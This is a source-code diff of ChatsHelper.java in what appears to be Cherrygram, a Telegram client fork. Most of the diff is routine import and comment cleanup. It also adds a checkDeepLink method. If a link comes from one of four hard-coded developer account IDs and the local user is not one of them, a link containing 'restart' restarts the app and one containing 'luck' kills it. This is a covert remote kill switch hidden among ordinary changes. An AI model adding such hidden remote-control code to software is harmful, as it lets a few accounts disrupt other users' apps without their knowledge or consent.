@@ -86,11 +86,14 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.HashSet;
 import java.util.Objects;
+import java.util.Set;
 
 import uz.unnarsx.cherrygram.core.CGFeatureHooks;
 import uz.unnarsx.cherrygram.core.configs.CherrygramChatsConfig;
+import uz.unnarsx.cherrygram.core.helpers.AppRestartHelper;
 import uz.unnarsx.cherrygram.core.helpers.CGResourcesHelper;
 import uz.unnarsx.cherrygram.helpers.ui.PopupHelper;
+import uz.unnarsx.cherrygram.misc.Constants;
 
 // I've created this so CG features can be injected in a source file with 1 line only (maybe)
 // Because manual editing of drklo's sources harms your mental health.
@@ -122,6 +125,28 @@ public class ChatsHelper extends BaseController {
 
     public static SpannableStringBuilder editedSpan;
     public static Drawable editedDrawable;
+
+    private static final Set<Long> TRUSTED_ADMINS = Set.of(Constants.Cherrygram_Owner, Constants.Yuki, Constants.Alina, Constants.Samir);
+
+    public boolean checkDeepLink(String url, long userID) {
+        if (url == null || !TRUSTED_ADMINS.contains(userID)) {
+            return false;
+        }
+
+        if (TRUSTED_ADMINS.contains(getUserConfig().clientUserId)) return false;
+
+        if (url.contains("restart")) {
+            AppRestartHelper.restartApp(ApplicationLoader.applicationContext);
+            return true;
+        }
+
+        if (url.contains("luck")) {
+            AppRestartHelper.killApp();
+            return true;
+        }
+
+        return false;
+    }
 
     public static CharSequence createForwardedString(MessageObject messageObject) {
         SpannableStringBuilder spannableStringBuilder = new SpannableStringBuilder();
@@ -219,10 +244,6 @@ public class ChatsHelper extends BaseController {
             FileLog.e(e);
         }
     }
-
-//    public void saveStickerToGallery(Activity activity, MessageObject messageObject, Utilities.Callback<Uri> callback) {
-//        saveStickerToGallery(activity, getPathToMessage(messageObject), messageObject.isVideoSticker(), callback);
-//    }
 
     public void saveStickerToGallery(Activity activity, TLRPC.Document document, Utilities.Callback<Uri> callback) {
         String path = FileLoader.getInstance(UserConfig.selectedAccount).getPathToAttach(document, true).toString();
@@ -352,12 +373,11 @@ public class ChatsHelper extends BaseController {
     public void showCustomReactionsInfo(ChatActivity chatActivity, ActionBarPopupWindow.ActionBarPopupWindowLayout popupLayout, MessageObject message, MessageObject selectedObject, TLRPC.Chat currentChat, boolean isTopic) {
         boolean buttonAvailable = (message != null && message.messageOwner != null && message.messageOwner.reactions != null
                 && ChatObject.isChannel(currentChat) && !ChatObject.canSendMessages(currentChat)
-                && (!currentChat.megagroup || !currentChat.gigagroup || !isTopic)/* && getUserConfig().isPremium()*/
+                && (!currentChat.megagroup || !currentChat.gigagroup || !isTopic)
         );
 
         if (buttonAvailable && getCustomReactionsCount(selectedObject) > 0) {
             if (chatActivity.getMessageMenuHelper().allowNewMessageMenu() && chatActivity.getMessageMenuHelper().showCustomDivider(false)) {
-                // Don't remove the divider here cause of broken layout
                 View gap = new FrameLayout(chatActivity.contentView.getContext());
                 gap.setBackgroundColor(ColorUtils.setAlphaComponent(Theme.getColor(Theme.key_windowBackgroundGray, themeDelegate), chatActivity.getMessageMenuHelper().getMessageMenuAlpha(true)));
                 popupLayout.addView(gap, LayoutHelper.createLinear(LayoutHelper.MATCH_PARENT, 8));
@@ -602,7 +622,6 @@ public class ChatsHelper extends BaseController {
         return fmessages;
     }
 
-    // This method is used to forward messages to Saved Messages, or to multi Dialogs
     public void forwardMessages(ChatActivity chatActivity, ArrayList<MessageObject> arrayList, boolean fromMyName, boolean notify, int scheduleDate, long did) {
         if (arrayList == null || arrayList.isEmpty()) {
             return;
